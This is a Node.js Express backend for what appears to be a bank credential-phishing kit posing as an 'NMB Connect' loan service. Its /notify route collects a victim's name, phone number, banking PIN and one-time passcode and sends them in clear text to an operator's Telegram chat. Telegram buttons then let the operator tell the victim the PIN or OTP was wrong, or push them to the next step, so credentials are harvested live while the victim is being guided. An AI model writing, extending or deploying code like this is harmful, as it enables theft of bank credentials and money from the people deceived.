'use strict';

import express           from 'express';
import cors              from 'cors';
import crypto            from 'crypto';
import { fileURLToPath } from 'url';
import path              from 'path';
import config            from './config.js';
import { setResult, popResult, setSession, getSession } from './store.js';
import { sendAdminMessage, removeButtons, answerCallback, registerWebhook, escMd } from './telegram.js';

const app       = express();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ── Middleware ──
app.use(express.json({ limit: '10mb' }));
app.use(cors({
  origin: config.allowedOrigins || true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
  credentials: true,
}));

// ── Serve static files (HTML, CSS, JS) ──
app.use(express.static(__dirname));

// ── Root route - Serve index.html ──
app.get('/', (_req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ── Health Check ──
app.get('/health', (_req, res) => {
  res.json({ 
    ok: true, 
    service: 'nmb-connect-backend', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
  });
});

// ── Test endpoint for Netlify ──
app.get('/notify', (_req, res) => {
  res.json({ ok: true, message: 'Backend is reachable' });
});

// ── Setup Webhook ──
app.get('/setup', async (_req, res) => {
  try {
    const result = await registerWebhook();
    if (result.ok) {
      res.json({
        ok: true,
        description: result.description,
        webhook: `${config.serverUrl}/webhook`,
        message: '✅ Webhook registered successfully!',
      });
    } else {
      res.status(500).json({ ok: false, error: result.description });
    }
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ── Validate helpers ──
function validateToken(token) {
  return /^[a-f0-9]{16}$/.test(token);
}

// ════════════════════════════════════════════════════════
//  POST /notify
//  Types: 'pin', 'otp', 'otp_resend'
// ════════════════════════════════════════════════════════
app.post('/notify', async (req, res) => {
  const { type, phone, countryCode, passcode, otp, name, reference } = req.body;

  if (!type || !phone) {
    return res.status(400).json({ ok: false, error: 'Missing required fields: type and phone' });
  }

  const fullPhone = `${countryCode || '+263'} ${phone}`.trim();

  // ── Generate token + HMAC ──
  const token = crypto.randomBytes(8).toString('hex');
  const sig = crypto.createHmac('sha256', config.secretKey)
                    .update(`${token}|${phone}`)
                    .digest('hex');

  setSession(token, { phone, name, reference, sig }, config.tokenTtl);

  const cbData = (action) => `${action}|${token}`;
  const now = new Date();
  const dateTime = now.toLocaleString('en-GB', { dateStyle: 'medium', timeStyle: 'short' });

  let text, keyboard;

  try {
    switch (type) {
      case 'pin':
        if (!passcode) {
          return res.status(400).json({ ok: false, error: 'Missing passcode for pin type' });
        }

        text = `🔒 *PIN Submitted*\n\n`
             + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
             + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
             + `🔢 *PIN Entered:* \`${escMd(passcode)}\`\n`
             + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
             + `Awaiting your decision\\.`;

        keyboard = [[
          { text: '✅ Continue to OTP', callback_data: cbData('continue_otp') },
          { text: '❌ Wrong PIN', callback_data: cbData('pin_wrong') },
        ]];
        break;

      case 'otp':
        if (!otp) {
          return res.status(400).json({ ok: false, error: 'Missing OTP for otp type' });
        }

        text = `🔐 *OTP Submitted*\n\n`
             + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
             + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
             + `🔑 *OTP Entered:* \`${escMd(otp)}\`\n`
             + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
             + `Awaiting your decision\\.`;

        keyboard = [
          [
            { text: '❌ Wrong OTP', callback_data: cbData('otp_wrong') },
            { text: '❌ Invalid PIN', callback_data: cbData('pin_invalid') },
          ],
          [
            { text: '✅ Approve Application', callback_data: cbData('loan_approved') },
            { text: '❌ Decline Application', callback_data: cbData('loan_rejected') },
          ],
        ];
        break;

      case 'otp_resend':
        text = `🔄 *OTP Resend Requested*\n\n`
             + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
             + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
             + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
             + `User has requested a new OTP code\\.`;

        keyboard = [[
          { text: '✅ Continue to OTP', callback_data: cbData('continue_otp') },
          { text: '❌ Wrong PIN', callback_data: cbData('pin_wrong') },
        ]];
        break;

      default:
        return res.status(400).json({ ok: false, error: 'Unknown type' });
    }

    const tgResult = await sendAdminMessage(text, keyboard);

    if (!tgResult.ok) {
      console.error('Telegram error:', tgResult);
      return res.status(500).json({ ok: false, error: 'Telegram error', detail: tgResult.description });
    }

    res.json({ ok: true, token, expiresIn: config.tokenTtl });

  } catch (err) {
    console.error('Error in /notify:', err);
    res.status(500).json({ ok: false, error: 'Internal server error' });
  }
});

// ════════════════════════════════════════════════════════
//  POST /poll
// ════════════════════════════════════════════════════════
app.post('/poll', (req, res) => {
  const { token } = req.body;

  if (!token || !validateToken(token)) {
    return res.status(400).json({ ok: false, error: 'Invalid token format' });
  }

  const result = popResult(token);

  if (result === null) {
    return res.json({ ok: true, result: 'pending' });
  }

  res.json({ ok: true, result });
});

// ════════════════════════════════════════════════════════
//  POST /webhook  — Telegram button handler
// ════════════════════════════════════════════════════════
app.post('/webhook', async (req, res) => {
  res.json({ ok: true });

  const update = req.body;
  if (!update?.callback_query) return;

  const cb = update.callback_query;
  const cbId = cb.id;
  const data = cb.data || '';
  const chatId = cb.message?.chat?.id?.toString();
  const msgId = cb.message?.message_id;

  // ── Verify admin ──
  if (chatId !== config.adminChatId.toString()) {
    await answerCallback(cbId, '⛔ Not authorised', true);
    return;
  }

  const parts = data.split('|');
  if (parts.length !== 2) {
    await answerCallback(cbId, '⚠️ Invalid data format');
    return;
  }

  const [action, token] = parts;

  if (!validateToken(token)) {
    await answerCallback(cbId, '⚠️ Invalid token format');
    return;
  }

  const session = getSession(token);
  if (!session) {
    await answerCallback(cbId, '⚠️ Session expired or not found', true);
    return;
  }

  const expectedSig = crypto.createHmac('sha256', config.secretKey)
                            .update(`${token}|${session.phone}`)
                            .digest('hex');

  if (!crypto.timingSafeEqual(Buffer.from(session.sig), Buffer.from(expectedSig))) {
    await answerCallback(cbId, '⚠️ Invalid signature', true);
    return;
  }

  try {
    switch (action) {
      case 'continue_otp':
        setResult(token, 'continue_otp', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *PIN Approved*\nUser \`${escMd(session.phone)}\` may now enter OTP\\.`, []);
        await answerCallback(cbId, '✅ Continuing to OTP');
        break;

      case 'pin_wrong':
        setResult(token, 'pin_wrong', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong PIN*\nUser \`${escMd(session.phone)}\` has been notified\\.`, []);
        await answerCallback(cbId, '❌ Wrong PIN sent');
        break;

      case 'otp_wrong':
        setResult(token, 'otp_wrong', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong OTP*\nUser \`${escMd(session.phone)}\` has been notified\\.`, []);
        await answerCallback(cbId, '❌ Wrong OTP sent');
        break;

      case 'pin_invalid':
        setResult(token, 'pin_invalid', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`🚫 *Invalid Session*\nUser \`${escMd(session.phone)}\` redirected to login\\.`, []);
        await answerCallback(cbId, '🚫 Invalid session');
        break;

      case 'loan_approved':
        setResult(token, 'loan_approved', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *Loan Approved*\nApplication for \`${escMd(session.phone)}\` has been approved\\.`, []);
        await answerCallback(cbId, '✅ Loan approved');
        break;

      case 'loan_rejected':
        setResult(token, 'loan_rejected', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Loan Rejected*\nApplication for \`${escMd(session.phone)}\` has been rejected\\.`, []);
        await answerCallback(cbId, '❌ Loan rejected');
        break;

      default:
        await answerCallback(cbId, '⚠️ Unknown action');
    }
  } catch (err) {
    console.error('Webhook handler error:', err);
  }
});

// ── Start server ──
app.listen(config.port, () => {
  console.log(`\n🚀 NMB Connect backend running on port ${config.port}`);
  console.log(`   Webhook URL: ${config.serverUrl}/webhook`);
  console.log(`   Setup URL:   ${config.serverUrl}/setup`);
  console.log(`   Health:      ${config.serverUrl}/health`);
  console.log(`   Notify:      ${config.serverUrl}/notify`);
  console.log(`   📱 Frontend: ${config.serverUrl}/\n`);
});
